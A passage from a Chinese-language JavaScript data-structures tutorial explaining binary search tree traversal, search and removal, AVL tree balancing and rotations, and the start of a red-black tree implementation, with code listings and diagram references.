<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br></div></div><h2 id="_19-树的遍历"> 19. 树的遍历</h2>
<ul>
<li>中序遍历：中序遍历是一种以上行顺序访问 BST 所有节点的遍历方式，也就是以从最小到最大的顺序访问所有节点。中序遍历的一种应用就是对树进行排序操作。</li>
</ul>
<div><pre><code><span>class</span> <span>InOrderTree</span> <span>extends</span> <span>BinarySearchTree</span> <span>{</span>
  <span>inOrderTraverse</span><span>(</span><span>callback</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>inOrderTraverseNode</span><span>(</span><span>this</span><span>.</span>root<span>,</span> callback<span>)</span>
  <span>}</span>
  <span>inOrderTraverseNode</span><span>(</span><span>node<span>,</span> callback</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>node <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>inOrderTraverseNode</span><span>(</span>node<span>.</span>left<span>,</span> callback<span>)</span>
      <span>callback</span><span>(</span>node<span>.</span>key<span>)</span>
      <span>this</span><span>.</span><span>inOrderTraverseNode</span><span>(</span>node<span>.</span>right<span>,</span> callback<span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><img :src="$withBase('/images/JS-Algorithms/树的遍历-中序遍历.png')" loading="lazy">
<ul>
<li>先序遍历：先序遍历是以优先于后代节点的顺序访问每个节点的。先序遍历的一种应用是打印一个结构化的文档。</li>
</ul>
<div><pre><code><span>class</span> <span>PreOrderTree</span> <span>extends</span> <span>BinarySearchTree</span> <span>{</span>
  <span>preOrderTraverse</span><span>(</span><span>callback</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>preOrderTraverseNode</span><span>(</span><span>this</span><span>.</span>root<span>,</span> callback<span>)</span>
  <span>}</span>
  <span>preOrderTraverseNode</span><span>(</span><span>node<span>,</span> callback</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>node <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>callback</span><span>(</span>node<span>.</span>key<span>)</span>
      <span>this</span><span>.</span><span>preOrderTraverseNode</span><span>(</span>node<span>.</span>left<span>,</span> callback<span>)</span>
      <span>this</span><span>.</span><span>preOrderTraverseNode</span><span>(</span>node<span>.</span>right<span>,</span> callback<span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><img :src="$withBase('/images/JS-Algorithms/树的遍历-先序遍历.png')" loading="lazy">
<ul>
<li>后序遍历：后序遍历则是先访问节点的后代节点，再访问节点本身。后序遍历的一种应用是计算一个目录及其子目录中所有文件所占空间的大小。</li>
</ul>
<div><pre><code><span>class</span> <span>PostOrderTree</span> <span>extends</span> <span>BinarySearchTree</span> <span>{</span>
  <span>postOrderTraverse</span><span>(</span><span>callback</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>postOrderTraverseNode</span><span>(</span><span>this</span><span>.</span>root<span>,</span> callback<span>)</span>
  <span>}</span>
  <span>postOrderTraverseNode</span><span>(</span><span>node<span>,</span> callback</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>node <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>postOrderTraverseNode</span><span>(</span>node<span>.</span>left<span>,</span> callback<span>)</span>
      <span>this</span><span>.</span><span>postOrderTraverseNode</span><span>(</span>node<span>.</span>right<span>,</span> callback<span>)</span>
      <span>callback</span><span>(</span>node<span>.</span>key<span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><img :src="$withBase('/images/JS-Algorithms/树的遍历-后序遍历.png')" loading="lazy">
<h2 id="_20-搜索树中的值"> 20. 搜索树中的值</h2>
<ul>
<li>
<p>要移除有两个子节点的节点，需要执行四个步骤。</p>
<blockquote>
<ol>
<li>当找到了要移除的节点后，需要找到它右边子树中最小的节点。</li>
<li>然后，用它右侧子树中最小节点的键去更新这个节点的值。通过这一步，我们改变了这个节点的键，也就是说它被移除了。</li>
<li>但是，这样在树中就有两个拥有相同键的节点了，这是不行的。要继续把右侧子树中的最小节点移除，毕竟它已经被移至要移除的节点的位置了。</li>
<li>最后，向它的父节点返回更新后节点的引用。</li>
</ol>
</blockquote>
<img :src="$withBase('/images/JS-Algorithms/搜索树种的值-移除有两个子节点的节点.png')" loading="lazy">
</li>
</ul>
<div><pre><code><span>class</span> <span>Tree</span> <span>extends</span> <span>BinarySearchTree</span> <span>{</span>
  <span>// 搜索最小值</span>
  <span>min</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>minNode</span><span>(</span><span>this</span><span>.</span>root<span>)</span>
  <span>}</span>
  <span>minNode</span><span>(</span><span>node</span><span>)</span> <span>{</span>
    <span>let</span> current <span>=</span> node
    <span>while</span> <span>(</span>current <span>!=</span> <span>null</span> <span>&amp;&amp;</span> current<span>.</span>left <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      current <span>=</span> current<span>.</span>left
    <span>}</span>
    <span>return</span> current
  <span>}</span>
  <span>// 搜索最大值</span>
  <span>max</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>maxNode</span><span>(</span><span>this</span><span>.</span>root<span>)</span>
  <span>}</span>
  <span>maxNode</span><span>(</span><span>node</span><span>)</span> <span>{</span>
    <span>let</span> current <span>=</span> node
    <span>while</span> <span>(</span>current <span>!=</span> <span>null</span> <span>&amp;&amp;</span> current<span>.</span>right <span>!=</span> <span>null</span><span>)</span> <span>{</span>
      current <span>=</span> current<span>.</span>right
    <span>}</span>
    <span>return</span> current
  <span>}</span>
  <span>// 搜索一个特定的值</span>
  <span>search</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>searchNode</span><span>(</span><span>this</span><span>.</span>root<span>,</span> key<span>)</span>
  <span>}</span>
  <span>searchNode</span><span>(</span><span>node<span>,</span> key</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>node <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>return</span> <span>false</span>
    <span>}</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>compareFn</span><span>(</span>key<span>,</span> node<span>.</span>key<span>)</span> <span>===</span> Compare<span>.</span><span>LESS_THAN</span><span>)</span> <span>{</span>
      <span>return</span> <span>this</span><span>.</span><span>searchNode</span><span>(</span>node<span>.</span>left<span>,</span> key<span>)</span>
    <span>}</span> <span>else</span> <span>if</span> <span>(</span><span>this</span><span>.</span><span>compareFn</span><span>(</span>key<span>,</span> node<span>.</span>key<span>)</span> <span>===</span> Compare<span>.</span><span>BIGGER_THAN</span><span>)</span> <span>{</span>
      <span>return</span> <span>this</span><span>.</span><span>searchNode</span><span>(</span>node<span>.</span>right<span>,</span> key<span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>return</span> <span>true</span>
    <span>}</span>
  <span>}</span>
  <span>// 移除一个节点</span>
  <span>removeNode</span><span>(</span><span>node<span>,</span> key</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>node <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>return</span> <span>null</span>
    <span>}</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>compareFn</span><span>(</span>key<span>,</span> node<span>.</span>key<span>)</span> <span>===</span> Compare<span>.</span><span>LESS_THAN</span><span>)</span> <span>{</span>
      node<span>.</span>left <span>=</span> <span>this</span><span>.</span><span>removeNode</span><span>(</span>node<span>.</span>left<span>,</span> key<span>)</span>
      <span>return</span> node
    <span>}</span> <span>else</span> <span>if</span> <span>(</span><span>this</span><span>.</span><span>compareFn</span><span>(</span>key<span>,</span> node<span>.</span>key<span>)</span> <span>===</span> Compare<span>.</span><span>BIGGER_THAN</span><span>)</span> <span>{</span>
      node<span>.</span>right <span>=</span> <span>this</span><span>.</span><span>removeNode</span><span>(</span>node<span>.</span>right<span>,</span> key<span>)</span>
      <span>return</span> node
    <span>}</span> <span>else</span> <span>{</span>
      <span>// 键等于 node.key</span>
      <span>// 第一种情况</span>
      <span>if</span> <span>(</span>node<span>.</span>left <span>==</span> <span>null</span> <span>&amp;&amp;</span> node<span>.</span>right <span>==</span> <span>null</span><span>)</span> <span>{</span>
        node <span>=</span> <span>null</span>
        <span>return</span> node
      <span>}</span>
      <span>// 第二种情况</span>
      <span>if</span> <span>(</span>node<span>.</span>left <span>==</span> <span>null</span><span>)</span> <span>{</span>
        node <span>=</span> node<span>.</span>right
        <span>return</span> node
      <span>}</span> <span>else</span> <span>if</span> <span>(</span>node<span>.</span>right <span>==</span> <span>null</span><span>)</span> <span>{</span>
        node <span>=</span> node<span>.</span>left
        <span>return</span> node
      <span>}</span>
      <span>// 第三种情况</span>
      <span>const</span> aux <span>=</span> <span>this</span><span>.</span><span>minNode</span><span>(</span>node<span>.</span>right<span>)</span>
      node<span>.</span>key <span>=</span> aux<span>.</span>key
      node<span>.</span>right <span>=</span> <span>this</span><span>.</span><span>removeNode</span><span>(</span>node<span>.</span>right<span>,</span> aux<span>.</span>key<span>)</span>
      <span>return</span> node
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br></div></div><h2 id="_21-自平衡树"> 21. 自平衡树</h2>
<ul>
<li>BST 存在一个问题：取决于你添加的节点数，树的一条边可能会非常深。也就是说，树的一条分支会有很多层，而其他的分支却只有几层。这会在需要在某条边上添加、移除和搜索某个节点时引起一些性能问题。为了解决这个问题，有一种树叫作 Adelson-Velskii-Landi 树（AVL 树）。AVL 树是一种自平衡二叉搜索树，意思是任何一个节点左右两侧子树的高度之差最多为 1。</li>
</ul>
<h2 id="_22-adelson-velskii-landi-树-avl-树"> 22. Adelson-Velskii-Landi 树（AVL 树）</h2>
<ul>
<li>
<p>节点的高度和平衡因子</p>
<ol>
<li>节点的高度是从节点到其任意子节点的边的最大值。</li>
</ol>
  <img :src="$withBase('/images/JS-Algorithms/AVL树-节点高度.png')" loading="lazy">
<ol start="2">
<li>在 AVL 树中，需要对每个节点计算右子树高度（ hr ）和左子树高度（ hl ）之间的差值，该值（ hr－hl ）应为 0、1 或 -1。如果结果不是这三个值之一，则需要平衡该 AVL 树。这就是平衡因子的概念。</li>
</ol>
  <img :src="$withBase('/images/JS-Algorithms/AVL树-平衡因子.png')" loading="lazy">
</li>
<li>
<p>平衡操作——AVL 旋转</p>
<ol>
<li>左 - 左（LL）：向右的单旋转。</li>
</ol>
<blockquote>
<ul>
<li>与平衡操作相关的节点有三个（X、Y、Z），将节点 X 置于节点 Y（平衡因子为+2）所在的位置。</li>
<li>节点 X 的左子树保持不变。</li>
<li>将节点 Y 的左子节点置为节点 X 的右子节点 Z。</li>
<li>将节点 X 的右子节点置为节点 Y。</li>
</ul>
</blockquote>
  <img :src="$withBase('/images/JS-Algorithms/AVL树-LL旋转.png')" loading="lazy">
<ol start="2">
<li>右 - 右（RR）：向左的单旋转。</li>
</ol>
<blockquote>
<ul>
<li>与平衡操作相关的节点有三个（X、Y、Z），将节点 X 置于节点 Y（平衡因子为-2）所在的位置。</li>
<li>节点 X 的右子树保持不变。</li>
<li>将节点 Y 的右子节点置为节点 X 的左子节点 Z。</li>
<li>将节点 X 的左子节点置为节点 Y。</li>
</ul>
</blockquote>
  <img :src="$withBase('/images/JS-Algorithms/AVL树-RR旋转.png')" loading="lazy">
<ol start="3">
<li>左 - 右（LR）：向右的双旋转。</li>
</ol>
<blockquote>
<ul>
<li>将节点 X 置于节点 Y（平衡因子为 -2）所在的位置。</li>
<li>将节点 Z 的左子节点置为节点 X 的右子节点。</li>
<li>将节点 Y 的右子节点置为节点 X 的左子节点。</li>
<li>将节点 X 的右子节点置为节点 Y。</li>
<li>将节点 X 的左子节点置为节点 Z。</li>
</ul>
</blockquote>
  <img :src="$withBase('/images/JS-Algorithms/AVL树-LR旋转.png')" loading="lazy">
<ol start="4">
<li>右 - 左（RL）：向左的双旋转。</li>
</ol>
<blockquote>
<ul>
<li>将节点 X 置于节点 Y（平衡因子为+2）所在的位置。</li>
<li>将节点 Y 的左子节点置为节点 X 的右子节点。</li>
<li>将节点 Z 的右子节点置为节点 X 的左子节点。</li>
<li>将节点 X 的左子节点置为节点 Y。</li>
<li>将节点 X 的右子节点置为节点 Z。</li>
</ul>
</blockquote>
  <img :src="$withBase('/images/JS-Algorithms/AVL树-RL旋转.png')" loading="lazy">
</li>
</ul>
<div><pre><code><span>const</span> BalanceFactor <span>=</span> <span>{</span>
  <span>UNBALANCED_RIGHT</span><span>:</span> <span>1</span><span>,</span>
  <span>SLIGHTLY_UNBALANCED_RIGHT</span><span>:</span> <span>2</span><span>,</span>
  <span>BALANCED</span><span>:</span> <span>3</span><span>,</span>
  <span>SLIGHTLY_UNBALANCED_LEFT</span><span>:</span> <span>4</span><span>,</span>
  <span>UNBALANCED_LEFT</span><span>:</span> <span>5</span><span>,</span>
<span>}</span>

<span>class</span> <span>AVLTree</span> <span>extends</span> <span>BinarySearchTree</span> <span>{</span>
  <span>constructor</span><span>(</span><span>compareFn <span>=</span> defaultCompare</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>compareFn<span>)</span>
    <span>this</span><span>.</span>compareFn <span>=</span> compareFn
    <span>this</span><span>.</span>root <span>=</span> <span>null</span>
  <span>}</span>
  <span>// 节点高度</span>
  <span>getNodeHeight</span><span>(</span><span>node</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>node <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>return</span> <span>-</span><span>1</span>
    <span>}</span>
    <span>return</span> <span>(</span>
      Math<span>.</span><span>max</span><span>(</span><span>this</span><span>.</span><span>getNodeHeight</span><span>(</span>node<span>.</span>left<span>)</span><span>,</span> <span>this</span><span>.</span><span>getNodeHeight</span><span>(</span>node<span>.</span>right<span>)</span><span>)</span> <span>+</span>
      <span>1</span>
    <span>)</span>
  <span>}</span>
  <span>// 平衡因子</span>
  <span>getBalanceFactor</span><span>(</span><span>node</span><span>)</span> <span>{</span>
    <span>const</span> heightDifference <span>=</span>
      <span>this</span><span>.</span><span>getNodeHeight</span><span>(</span>node<span>.</span>left<span>)</span> <span>-</span> <span>this</span><span>.</span><span>getNodeHeight</span><span>(</span>node<span>.</span>right<span>)</span>
    <span>switch</span> <span>(</span>heightDifference<span>)</span> <span>{</span>
      <span>case</span> <span>-</span><span>2</span><span>:</span>
        <span>return</span> BalanceFactor<span>.</span><span>UNBALANCED_RIGHT</span>
      <span>case</span> <span>-</span><span>1</span><span>:</span>
        <span>return</span> BalanceFactor<span>.</span><span>SLIGHTLY_UNBALANCED_RIGHT</span>
      <span>case</span> <span>1</span><span>:</span>
        <span>return</span> BalanceFactor<span>.</span><span>SLIGHTLY_UNBALANCED_LEFT</span>
      <span>case</span> <span>2</span><span>:</span>
        <span>return</span> BalanceFactor<span>.</span><span>UNBALANCED_LEFT</span>
      <span>default</span><span>:</span>
        <span>return</span> BalanceFactor<span>.</span><span>BALANCED</span>
    <span>}</span>
  <span>}</span>
  <span>// 向右的单旋转</span>
  <span>rotationLL</span><span>(</span><span>node</span><span>)</span> <span>{</span>
    <span>const</span> tmp <span>=</span> node<span>.</span>left
    node<span>.</span>left <span>=</span> tmp<span>.</span>right
    tmp<span>.</span>right <span>=</span> node
    <span>return</span> tmp
  <span>}</span>
  <span>// 向左的单旋转</span>
  <span>rotationRR</span><span>(</span><span>node</span><span>)</span> <span>{</span>
    <span>const</span> tmp <span>=</span> node<span>.</span>right
    node<span>.</span>right <span>=</span> tmp<span>.</span>left
    tmp<span>.</span>left <span>=</span> node
    <span>return</span> tmp
  <span>}</span>
  <span>// 向右的双旋转</span>
  <span>rotationLR</span><span>(</span><span>node</span><span>)</span> <span>{</span>
    node<span>.</span>left <span>=</span> <span>this</span><span>.</span><span>rotationRR</span><span>(</span>node<span>.</span>left<span>)</span>
    <span>return</span> <span>this</span><span>.</span><span>rotationLL</span><span>(</span>node<span>)</span>
  <span>}</span>
  <span>// 向左的双旋转</span>
  <span>rotationRL</span><span>(</span><span>node</span><span>)</span> <span>{</span>
    node<span>.</span>right <span>=</span> <span>this</span><span>.</span><span>rotationLL</span><span>(</span>node<span>.</span>right<span>)</span>
    <span>return</span> <span>this</span><span>.</span><span>rotationRR</span><span>(</span>node<span>)</span>
  <span>}</span>
  <span>// 向 AVL 树插入节点</span>
  <span>insert</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>root <span>=</span> <span>this</span><span>.</span><span>insertNode</span><span>(</span><span>this</span><span>.</span>root<span>,</span> key<span>)</span>
  <span>}</span>
  <span>insertNode</span><span>(</span><span>node<span>,</span> key</span><span>)</span> <span>{</span>
    <span>// 像在 BST 树中一样插入节点</span>
    <span>if</span> <span>(</span>node <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>return</span> <span>new</span> <span>Node</span><span>(</span>key<span>)</span>
    <span>}</span> <span>else</span> <span>if</span> <span>(</span><span>this</span><span>.</span><span>compareFn</span><span>(</span>key<span>,</span> node<span>.</span>key<span>)</span> <span>===</span> Compare<span>.</span><span>LESS_THAN</span><span>)</span> <span>{</span>
      node<span>.</span>left <span>=</span> <span>this</span><span>.</span><span>insertNode</span><span>(</span>node<span>.</span>left<span>,</span> key<span>)</span>
    <span>}</span> <span>else</span> <span>if</span> <span>(</span><span>this</span><span>.</span><span>compareFn</span><span>(</span>key<span>,</span> node<span>.</span>key<span>)</span> <span>===</span> Compare<span>.</span><span>BIGGER_THAN</span><span>)</span> <span>{</span>
      node<span>.</span>right <span>=</span> <span>this</span><span>.</span><span>insertNode</span><span>(</span>node<span>.</span>right<span>,</span> key<span>)</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>return</span> node <span>// 重复的键</span>
    <span>}</span>
    <span>// 如果需要，将树进行平衡操作</span>
    <span>const</span> balanceFactor <span>=</span> <span>this</span><span>.</span><span>getBalanceFactor</span><span>(</span>node<span>)</span>
    <span>if</span> <span>(</span>balanceFactor <span>===</span> BalanceFactor<span>.</span><span>UNBALANCED_LEFT</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span><span>this</span><span>.</span><span>compareFn</span><span>(</span>key<span>,</span> node<span>.</span>left<span>.</span>key<span>)</span> <span>===</span> Compare<span>.</span><span>LESS_THAN</span><span>)</span> <span>{</span>
        node <span>=</span> <span>this</span><span>.</span><span>rotationLL</span><span>(</span>node<span>)</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span><span>rotationLR</span><span>(</span>node<span>)</span>
      <span>}</span>
    <span>}</span>
    <span>if</span> <span>(</span>balanceFactor <span>===</span> BalanceFactor<span>.</span><span>UNBALANCED_RIGHT</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span><span>this</span><span>.</span><span>compareFn</span><span>(</span>key<span>,</span> node<span>.</span>right<span>.</span>key<span>)</span> <span>===</span> Compare<span>.</span><span>BIGGER_THAN</span><span>)</span> <span>{</span>
        node <span>=</span> <span>this</span><span>.</span><span>rotationRR</span><span>(</span>node<span>)</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span><span>rotationRL</span><span>(</span>node<span>)</span>
      <span>}</span>
    <span>}</span>
    <span>return</span> node
  <span>}</span>
  <span>// 从 AVL 树中移除节点</span>
  <span>removeNode</span><span>(</span><span>node<span>,</span> key</span><span>)</span> <span>{</span>
    node <span>=</span> <span>super</span><span>.</span><span>removeNode</span><span>(</span>node<span>,</span> key<span>)</span>
    <span>if</span> <span>(</span>node <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>return</span> node <span>// null，不需要进行平衡</span>
    <span>}</span>
    <span>// 检测树是否平衡</span>
    <span>const</span> balanceFactor <span>=</span> <span>this</span><span>.</span><span>getBalanceFactor</span><span>(</span>node<span>)</span>
    <span>if</span> <span>(</span>balanceFactor <span>===</span> BalanceFactor<span>.</span><span>UNBALANCED_LEFT</span><span>)</span> <span>{</span>
      <span>const</span> balanceFactorLeft <span>=</span> <span>this</span><span>.</span><span>getBalanceFactor</span><span>(</span>node<span>.</span>left<span>)</span>
      <span>if</span> <span>(</span>
        balanceFactorLeft <span>===</span> BalanceFactor<span>.</span><span>BALANCED</span> <span>||</span>
        balanceFactorLeft <span>===</span> BalanceFactor<span>.</span><span>SLIGHTLY_UNBALANCED_LEFT</span>
      <span>)</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span><span>rotationLL</span><span>(</span>node<span>)</span>
      <span>}</span>
      <span>if</span> <span>(</span>balanceFactorLeft <span>===</span> BalanceFactor<span>.</span><span>SLIGHTLY_UNBALANCED_RIGHT</span><span>)</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span><span>rotationLR</span><span>(</span>node<span>.</span>left<span>)</span>
      <span>}</span>
    <span>}</span>
    <span>if</span> <span>(</span>balanceFactor <span>===</span> BalanceFactor<span>.</span><span>UNBALANCED_RIGHT</span><span>)</span> <span>{</span>
      <span>const</span> balanceFactorRight <span>=</span> <span>this</span><span>.</span><span>getBalanceFactor</span><span>(</span>node<span>.</span>right<span>)</span>
      <span>if</span> <span>(</span>
        balanceFactorRight <span>===</span> BalanceFactor<span>.</span><span>BALANCED</span> <span>||</span>
        balanceFactorRight <span>===</span> BalanceFactor<span>.</span><span>SLIGHTLY_UNBALANCED_RIGHT</span>
      <span>)</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span><span>rotationRR</span><span>(</span>node<span>)</span>
      <span>}</span>
      <span>if</span> <span>(</span>balanceFactorRight <span>===</span> BalanceFactor<span>.</span><span>SLIGHTLY_UNBALANCED_LEFT</span><span>)</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span><span>rotationRL</span><span>(</span>node<span>.</span>right<span>)</span>
      <span>}</span>
    <span>}</span>
    <span>return</span> node
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br></div></div><h2 id="_23-红黑树"> 23. 红黑树</h2>
<ul>
<li>
<p>和 AVL 树一样，红黑树也是一个自平衡二叉搜索树。我们学习了对 AVL 书插入和移除节点可能会造成旋转，所以我们需要一个包含多次插入和删除的自平衡树，红黑树是比较好的。如果插入和删除频率较低（我们更需要多次进行搜索操作），那么 AVL 树比红黑树更好。</p>
</li>
<li>
<p>在红黑树中，每个节点都遵循以下规则。</p>
<ol>
<li>顾名思义，每个节点不是红的就是黑的。</li>
<li>树的根节点是黑的。</li>
<li>所有叶节点都是黑的（用 NULL 引用表示的节点）。</li>
<li>如果一个节点是红的，那么它的两个子节点都是黑的。</li>
<li>不能有两个相邻的红节点，一个红节点不能有红的父节点或子节点。</li>
<li>从给定的节点到它的后代节点（ NULL 叶节点）的所有路径包含相同数量的黑色节点。</li>
</ol>
</li>
</ul>
<div><pre><code><span>class</span> <span>RedBlackNode</span> <span>extends</span> <span>Node</span> <span>{</span>
  <span>constructor</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>key<span>)</span>
    <span>this</span><span>.</span>key <span>=</span> key
    <span>this</span><span>.</span>color <span>=</span> Colors<span>.</span><span>RED</span>
    <span>this</span><span>.</span>parent <span>=</span> <span>null</span>
  <span>}</span>
  <span>isRed</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>color <span>===</span> Colors<span>.</span><span>RED</span>
  <span>}</span>
<span>}</span>

<span>class</span> <span>RedBlackTree</span> <span>extends</span> <span>BinarySearchTree</span> <span>{</span>
  <span>constructor</span><span>(</span><span>compareFn <span>=</span> defaultCompare</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>compareFn<span>)</span>
    <span>this</span><span>.</span>compareFn <span>=</span> compareFn
    <span>this</span><span>.</span>root <span>=</span> <span>null</span>
  <span>}</span>
  <span>// 向红黑树插入节点</span>
  <span>insert</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span>root <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>root <span>=</span> <span>new</span> <span>RedBlackNode</span><span>(</span>key<span>)</span>
      <span>this</span><span>.</span>root<span>.</span>color <span>=</span> Colors<span>.</span><span>BLACK</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>const</span> newNode <span>=</span> <span>this</span><span>.</span><span>insertNode</span><span>(</span><span>this</span><span>.</span>root<span>,</span> key<span>)</span>
      <span>this</span><span>.</span><span>fixTreeProperties</span><span>(</span>newNode<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>insertNode</span><span>(</span><span>node<span>,</span> key</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>compareFn</span><span>(</span>key<span>,</span> node<span>.</span>key<span>)</span> <span>===</span> Compare<span>.</span><span>LESS_THAN</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>node<span>.</span>left <span>==</span> <span>null</span><span>)</span> <span>{</span>
        node<span>.</span>left <span>=</span> <span>new</span> <span>RedBlackNode</span><span>(</span>key<span>)</span>
        node<span>.</span>left<span>.</span>parent <span>=</span> node
        <span>return</span> node<span>.</span>left
      <span>}</span> <span>else</span> <span>{</span>
        <span>return</span> <span>this</span><span>.</span><span>insertNode</span><span>(</span>node<span>.</span>left<span>,</span> key<span>)</span>
      <span>}</span>
